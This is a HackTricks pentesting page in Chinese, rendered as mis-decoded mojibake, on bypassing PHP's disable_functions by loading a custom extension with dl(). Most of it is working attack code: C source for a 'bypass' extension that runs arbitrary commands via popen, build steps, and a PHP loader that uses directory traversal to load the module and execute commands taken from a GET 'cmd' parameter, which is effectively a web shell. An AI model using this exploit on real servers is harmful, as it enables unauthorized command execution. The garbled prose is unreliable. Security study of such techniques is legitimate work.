<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æ”»å‡»</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

**é‡è¦è¯´æ˜ï¼š**

![image](https://user-images.githubusercontent.com/84577967/174675487-a4c4ca06-194f-4725-85af-231a2f35d56c.png)

**`dl`** æ˜¯ä¸€ä¸ªPHPå‡½æ•°ï¼Œå¯ç”¨äºåŠ è½½PHPæ‰©å±•ã€‚å¦‚æœè¯¥å‡½æ•°æ²¡æœ‰è¢«ç¦ç”¨ï¼Œå®ƒå¯èƒ½è¢«æ»¥ç”¨ä»¥**ç»•è¿‡`disable_functions`å¹¶æ‰§è¡Œä»»æ„å‘½ä»¤**ã€‚\
ç„¶è€Œï¼Œå®ƒæœ‰ä¸€äº›ä¸¥æ ¼çš„é™åˆ¶ï¼š

* `dl` å‡½æ•°å¿…é¡»åœ¨**ç¯å¢ƒä¸­å­˜åœ¨**ä¸”**æœªè¢«ç¦ç”¨**
* PHPæ‰©å±•**å¿…é¡»ä¸æœåŠ¡å™¨ä½¿ç”¨çš„ç›¸åŒä¸»ç‰ˆæœ¬**ï¼ˆPHP APIç‰ˆæœ¬ï¼‰ç¼–è¯‘ï¼ˆæ‚¨å¯ä»¥åœ¨phpinfoçš„è¾“å‡ºä¸­çœ‹åˆ°è¿™ä¸ªä¿¡æ¯ï¼‰
* PHPæ‰©å±•å¿…é¡»ä½äºç”±**`extension_dir`** æŒ‡ä»¤**å®šä¹‰çš„ç›®å½•**ä¸­ï¼ˆæ‚¨å¯ä»¥åœ¨phpinfoçš„è¾“å‡ºä¸­çœ‹åˆ°å®ƒï¼‰ã€‚æ”»å‡»è€…è¯•å›¾æ»¥ç”¨æœåŠ¡å™¨æ—¶ï¼Œå¾ˆä¸å¯èƒ½æœ‰æƒé™å†™å…¥è¿™ä¸ªç›®å½•ï¼Œæ‰€ä»¥è¿™ä¸ªè¦æ±‚å¯èƒ½ä¼šé˜»æ­¢æ‚¨æ»¥ç”¨è¿™ç§æŠ€æœ¯ï¼‰ã€‚

**å¦‚æœæ‚¨æ»¡è¶³è¿™äº›è¦æ±‚ï¼Œè¯·ç»§ç»­é˜…è¯»ä»** [**https://antichat.com/threads/70763/**](https://antichat.com/threads/70763/) **å¤åˆ¶çš„å¸–å­ï¼Œäº†è§£å¦‚ä½•ç»•è¿‡disable\_functions**

å½“ç®¡ç†å‘˜é…ç½®æœåŠ¡å™¨æ—¶ï¼Œä»–/å¥¹å¿½ç•¥äº†[dlå‡½æ•°](http://www.php.net/manual/en/function.dl.php)å¹¶æ²¡æœ‰ç¦ç”¨å®ƒï¼Œå› ä¸ºæ²¡æœ‰æåˆ°èƒ½å¤Ÿæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚\
[dlå‡½æ•°](http://www.php.net/manual/en/function.dl.php)ç”¨äºåœ¨è„šæœ¬æ‰§è¡Œæ—¶åŠ è½½PHPæ‰©å±•ã€‚\
\
ï¼ˆPHPæ‰©å±•æ˜¯ç”¨C/C++ç¼–å†™çš„ï¼Œç”¨äºç»™PHPå¢åŠ æ›´å¤šåŠŸèƒ½ã€‚ï¼‰\
\
æ”»å‡»è€…æ³¨æ„åˆ°è¯¥å‡½æ•°æ²¡æœ‰è¢«ç¦ç”¨ï¼Œå¹¶çœ‹åˆ°äº†æ½œåŠ›ï¼Œå†³å®šåˆ›å»ºä¸€ä¸ªPHPæ‰©å±•ã€‚\
æ”»å‡»è€…ä½¿ç”¨ä¸€ä¸ªå°è„šæœ¬`<?php echo 'PHP Version is '.PHP_VERSION; ?>`ï¼ˆPHP\_VERSIONæ˜¯ä¸€ä¸ªé¢„å®šä¹‰å¸¸é‡ï¼ŒåŒ…å«PHPçš„ç‰ˆæœ¬å·ã€‚ï¼‰æ£€æŸ¥PHPçš„ç‰ˆæœ¬ã€‚\
\
æ”»å‡»è€…è®°å½•ä¸‹ç‰ˆæœ¬å·ï¼Œå¹¶ä»[PHPç½‘ç«™](http://www.php.net/downloads.php)ä¸‹è½½tarballï¼Œåœ¨è¿™ä¸ªåœºæ™¯ä¸­ï¼Œç‰ˆæœ¬æ¯”å½“å‰å‘å¸ƒçš„ç‰ˆæœ¬æ—§ï¼Œæ‰€ä»¥æ”»å‡»è€…å¿…é¡»å»[æ¡£æ¡ˆé¦†](http://museum.php.net)ã€‚\
\
æ¥ä¸‹æ¥ä»–æå–æºä»£ç å¹¶[ç¼–è¯‘å’Œå®‰è£…](http://www.php.net/manual/en/install.php)åœ¨ä»–è‡ªå·±çš„ç›’å­ä¸Šçš„PHPç‰ˆæœ¬ã€‚\
\
ç°åœ¨æ˜¯æ—¶å€™åˆ›å»ºæ‰©å±•äº†\
æ”»å‡»è€…ä»PHPç½‘ç«™ä¸Šé˜…è¯»äº†[åˆ›å»ºPHPæ‰©å±•](http://www.php.net/manual/en/zend.creating.php)çš„èµ„æ–™ã€‚\
åœ¨é˜…è¯»äº†æ–‡æ¡£å¹¶åˆ›å»ºäº†ä¸€äº›è‡ªå·±çš„æ‰©å±•åï¼Œä»–å†³å®šæŸ¥çœ‹PHPä»£ç åº“ï¼Œå› ä¸ºä»–è¿½æ±‚çš„åŠŸèƒ½å·²ç»åˆ›å»ºå¥½äº†ã€‚\
\
å°†è¦å¤åˆ¶çš„åŠŸèƒ½æ˜¯[execå‡½æ•°](http://www.php.net/manual/en/function.exec.php)\
åœ¨ä»£ç åº“ä¸­ï¼Œå®ƒä½äºext/standard/exec.c\
\
ç›¸å…³éƒ¨åˆ†è¢«å®ç°åˆ°äº†å®ƒè‡ªå·±çš„æ–°æ‰©å±•ä¸­ã€‚\
\

**æ³¨æ„ï¼š**

åœ¨å¼€å§‹ç¼–è¯‘ä»£ç ä¹‹å‰ï¼Œæ‚¨åº”è¯¥æ³¨æ„ä¸¤ç‚¹ï¼š

1- `bypass.c` æ–‡ä»¶ä¸­çš„ `ZEND_MODULE_API_NO` çš„å€¼å¿…é¡»æ›´æ”¹ä¸ºæ‚¨æ­£åœ¨ä½¿ç”¨çš„å½“å‰ `Zend Extension Build`ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤è¡Œè·å–å®ƒï¼š
```bash
php -i | grep "Zend Extension Build" |awk -F"API4" '{print $2}' | awk -F"," '{print $1}'
```
2- å¦‚æœæ‚¨åœ¨ç¼–è¯‘æœ€æ–°ç‰ˆæœ¬çš„ PHPï¼ˆ5ã€7 å’Œ 8ï¼‰ä¸­çš„ bypass.c æ–‡ä»¶æ—¶é‡åˆ°ä»»ä½•é”™è¯¯ï¼Œæ‚¨å¯ä»¥å°† PHP_FUNCTION(bypass_exec) æ›´æ”¹ä¸ºä»¥ä¸‹å†…å®¹ï¼š
```
PHP_FUNCTION(bypass_exec)
{
FILE *in;
char *command;
size_t command_len;
zend_string *ret;
php_stream *stream;

ZEND_PARSE_PARAMETERS_START(1, 1)
Z_PARAM_STRING(command, command_len)
ZEND_PARSE_PARAMETERS_END();

if (!command_len) {
zend_argument_value_error(1, "cannot be empty");
RETURN_THROWS();
}
if (strlen(command) != command_len) {
zend_argument_value_error(1, "must not contain any null bytes");
RETURN_THROWS();
}

#ifdef PHP_WIN32
if ((in=VCWD_POPEN(command, "rt"))==NULL) {
#else
if ((in=VCWD_POPEN(command, "r"))==NULL) {
#endif
php_error_docref(NULL, E_WARNING, "Unable to execute '%s'", command);
RETURN_FALSE;
}

stream = php_stream_fopen_from_pipe(in, "rb");
ret = php_stream_copy_to_mem(stream, PHP_STREAM_COPY_ALL, 0);
php_stream_close(stream);

if (ret && ZSTR_LEN(ret) > 0) {
RETVAL_STR(ret);
}
}
```
æ–‡ä»¶å¯¹äºå•ç‹¬çš„æ‰©å±•æœ€ç»ˆå¦‚ä¸‹æ‰€ç¤ºï¼š

{% code title="bypass.c" %}
```c
/*
+----------------------------------------------------------------------+
| Copyright (c) 1997-2003 The PHP Group                                |
+----------------------------------------------------------------------+
| This source file is subject to version 2.02 of the PHP license,      |
| that is bundled with this package in the file LICENSE, and is        |
| available at through the world-wide-web at                           |
| http://www.php.net/license/2_02.txt.                                 |
| If you did not receive a copy of the PHP license and are unable to   |
| obtain it through the world-wide-web, please send a note to          |
| license@php.net so we can mail you a copy immediately.               |
+----------------------------------------------------------------------+
*/


#ifdef HAVE_CONFIG_H
#include "config.h"
#endif

#include "php.h"
#include "php_bypass.h"

static function_entry bypass_functions[] = {
PHP_FE(bypass_exec, NULL)
{NULL, NULL, NULL}
};

zend_module_entry bypass_module_entry = {
#if ZEND_MODULE_API_NO >= 20010901
STANDARD_MODULE_HEADER,
#endif
PHP_BYPASS_EXTNAME,
bypass_functions,
NULL,
NULL,
NULL,
NULL,
NULL,
#if ZEND_MODULE_API_NO >= 20010901
PHP_BYPASS_VERSION,
#endif
STANDARD_MODULE_PROPERTIES
};

#ifdef COMPILE_DL_BYPASS
ZEND_GET_MODULE(bypass)
#endif


PHP_FUNCTION(bypass_exec){
FILE *in;
int readbytes, total_readbytes=0, allocated_space;
pval **cmd;
char *ret;

if (ZEND_NUM_ARGS()!=1 || zend_get_parameters_ex(1, &cmd)==FAILURE) {
WRONG_PARAM_COUNT;
}

convert_to_string_ex(cmd);
#ifdef PHP_WIN32
if ((in=VCWD_POPEN(Z_STRVAL_PP(cmd), "rt"))==NULL) {
#else
if ((in=VCWD_POPEN(Z_STRVAL_PP(cmd), "r"))==NULL) {
#endif
php_error_docref(NULL TSRMLS_CC, E_WARNING, "Unable to execute '%s'", Z_STRVAL_PP(cmd));
RETURN_FALSE;
}

allocated_space = EXEC_INPUT_BUF;
ret = (char *) emalloc(allocated_space);

while (1) {
readbytes = fread(ret+total_readbytes, 1, EXEC_INPUT_BUF, in);
if (readbytes<=0) {
break;
}

total_readbytes += readbytes;
allocated_space = total_readbytes+EXEC_INPUT_BUF;
ret = (char *) erealloc(ret, allocated_space);
}

pclose(in);

RETVAL_STRINGL(ret, total_readbytes, 0);
Z_STRVAL_P(return_value)[total_readbytes] = '\';
}
```
{% endcode %}

{% code title="php_bypass.h" %}
```c
#ifndef PHP_BYPASS_H
#define PHP_BYPASS_H 1

#define PHP_BYPASS_VERSION "1.0"
#define PHP_BYPASS_EXTNAME "bypass"

PHP_FUNCTION(bypass_exec);

extern zend_module_entry bypass_module_entry;
#define phpext_bypass_ptr &bypass_module_entry

#endif
```
{% endcode %}

{% code title="config.m4" %}
```bash
PHP_ARG_ENABLE(bypass, [whether to enable bypass support],[--enable-bypass])

if test "$PHP_BYPASS" = "yes"; then
AC_DEFINE(HAVE_BYPASS, 1, [Whether you have bypass])
PHP_NEW_EXTENSION(bypass, bypass.c, $ext_shared)
fi
```
{% endcode %}

åˆ›å»ºæ–‡ä»¶åï¼Œæ˜¯æ—¶å€™æ„å»ºPHPæ‰©å±•äº†ã€‚
```
phpize
./configure
make
```
å®Œæˆåï¼Œç¼–è¯‘åçš„æ‰©å±•å°†ä½äºå¸¦æœ‰æ–‡ä»¶åbypass.soçš„moduleså­ç›®å½•ä¸­ã€‚
æ–‡ä»¶è¢«å¤åˆ¶åˆ°ä¸€ä¸ªå®‰å…¨çš„åœ°æ–¹ï¼Œç°åœ¨æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥æ¸…ç†æ–°åˆ›å»ºçš„æ–‡ä»¶ã€‚
```
make clean
phpize --clean
```
æ”»å‡»è€…ç°åœ¨å°†æ–°åˆ›å»ºçš„æ‰©å±•ä¸Šä¼ åˆ°å—å®³ä¸»æœºã€‚

ï¼ˆæ³¨æ„ï¼šPHPçš„ä¸»è¦ç‰ˆæœ¬ä½¿ç”¨ä¸åŒçš„APIç‰ˆæœ¬ï¼Œä¸ºäº†èƒ½å¤Ÿåœ¨ä¸€ä¸ªä¸»æœºä¸Šç¼–è¯‘æ‰©å±•å¹¶ä¸Šä¼ åˆ°å¦ä¸€ä¸ªä¸»æœºï¼ŒAPIç‰ˆæœ¬å¿…é¡»åŒ¹é…ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæœ€åˆåœ¨æ”»å‡»è€…çš„æœºå™¨ä¸Šå®‰è£…ç›¸åŒPHPç‰ˆæœ¬çš„åŸå› ã€‚ï¼‰

ä¸ºäº†ä½¿ç”¨dlå‡½æ•°åŠ è½½æ‰©å±•ï¼Œæ‰©å±•éœ€è¦ä½äºç”±extension_diræŒ‡ä»¤å®šä¹‰çš„æ‰©å±•ç›®å½•ä¸­ã€‚
è¿™å¯èƒ½æ˜¯ä¸€ä¸ªé—®é¢˜ï¼Œå› ä¸ºæ”»å‡»è€…ä¸å¤ªå¯èƒ½æ‹¥æœ‰è¯¥ç›®å½•çš„å†™æƒé™ï¼Œä½†æ˜¯æœ‰åŠæ³•è§£å†³è¿™ä¸ªé—®é¢˜ã€‚
å¼€å‘äººå‘˜åœ¨dlå‡½æ•°é¡µé¢çš„æ³¨é‡Šéƒ¨åˆ†è®¨è®ºäº†è¿™ä¸ªé—®é¢˜ã€‚

è®¨è®ºçš„æ¦‚å¿µæ˜¯ä½¿ç”¨ä»å®šä¹‰çš„æ‰©å±•ç›®å½•çš„ç›¸å¯¹è·¯å¾„ã€‚
ä¾‹å¦‚ï¼Œå¦‚æœæ‰©å±•ç›®å½•è®¾ç½®ä¸º/usr/php/extensionsï¼Œå¹¶ä¸”ä½ æƒ³åœ¨å½“å‰çš„webç›®å½•/home/example.com/htmlä¸­åŠ è½½bypass.soï¼Œä½ å¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ–¹å¼æ“ä½œï¼š
```php
<?php
dl('../../../home/example.com/html/bypass.so');
?>
```
æ­¤æ–¹æ³•å¯ä»¥ç»•è¿‡éœ€è¦å°†æ‰©å±•æ”¾åœ¨å®šä¹‰çš„æ‰©å±•ç›®å½•ä¸­çš„é™åˆ¶ã€‚

è¿˜æœ‰ä¸€ç§è‡ªåŠ¨åŒ–çš„æ–¹æ³•ï¼Œè¿™æ ·æ‚¨å°±ä¸å¿…ä¸ºä¸åŒçš„ä¸»æœºæ›´æ”¹ç›¸å¯¹è·¯å¾„ï¼Œè¿™æ®µä»£ç æ˜¯ç”± endofyourself \[at\] yahoo \[dot\] com åˆ›å»ºï¼Œå¹¶ç”± mag\_2000 \[at\] front \[dot\] ru åæ¥è¿›è¡Œäº†æ”¹è¿›ã€‚

è¯¥å‡½æ•°æœ‰ä¸€ä¸ªå°é—®é¢˜ï¼Œåœ¨æŸäº›ä¸»æœºä¸Šï¼Œæ‰©å±•ç›®å½•è¢«è®¾ç½®ä¸º "./"ï¼Œè¿™ä¸ªå‡½æ•°æ²¡æœ‰è€ƒè™‘åˆ°å¦‚æœæ‰©å±•ç›®å½•è¢«è®¾ç½®ä¸ºç›¸å¯¹è·¯å¾„çš„æƒ…å†µï¼Œè§£å†³è¿™ä¸ªé—®é¢˜çš„æ–¹æ³•æ˜¯ä½¿ç”¨ realpath å‡½æ•°ã€‚

æœ€ç»ˆç”¨äºåŠ è½½æ‰©å±•å¹¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ä»¥ç»•è¿‡ç¦ç”¨å‡½æ•°çš„è„šæœ¬å¦‚ä¸‹ï¼š
```php
<?php

function dl_local( $extensionFile ) {
if(!(bool)ini_get('enable_dl')
||(bool)ini_get('safe_mode')){
die('Loading extensions is not permitted.');
}

if(!file_exists($extensionFile)){
die('File '.$extensionFile.' does not exist.');
}

if(!is_executable($extensionFile)){
die('File '.$extensionFile.' is not executable. ( chmod +x '.$extensionFile.' )');
}

$currentDir = getcwd().'/';
$currentExtPath = realpath(ini_get('extension_dir'));

$subDirs = preg_match_all("/\//",$currentExtPath ,$matches);
unset($matches);

if(!(bool)$subDirs){
die('Could not determine a valid extension path [extension_dir]');
}

$extPathLastChar=strlen($currentExtPath )-1;

if($extPathLastChar==strrpos($currentExtPath,'/')){
$subDirs--;}$backDirStr = '';

for($i = 1; $i <= $subDirs; $i++){
$backDirStr .='..';
if($i != $subDirs){
$backDirStr .='/';
}
}

$finalExtPath = $backDirStr.$currentDir.$extensionFile;
if(!dl($finalExtPath)){
die();
}


$loadedExtensions = get_loaded_extensions();
$thisExtName = $loadedExtensions[sizeof($loadedExtensions)-1];
return $thisExtName;
}

@ini_set ('display_errors','1');
error_reporting(E_ALL);

dl_local('bypass.so');

if(@$_GET['cmd']){
$output = bypass_exec($_GET['cmd']);
echo '<pre>'.$output.'</pre>';
}
?>
```
æ”»å‡»è€…ç°åœ¨åªéœ€è°ƒç”¨å¸¦æœ‰æ‰€éœ€å‘½ä»¤çš„ cmd å˜é‡çš„è„šæœ¬ URL å³å¯æ‰§è¡Œå‘½ä»¤ã€‚
```
http://www.example.com/script.php?cmd=ls
```
<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼:

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
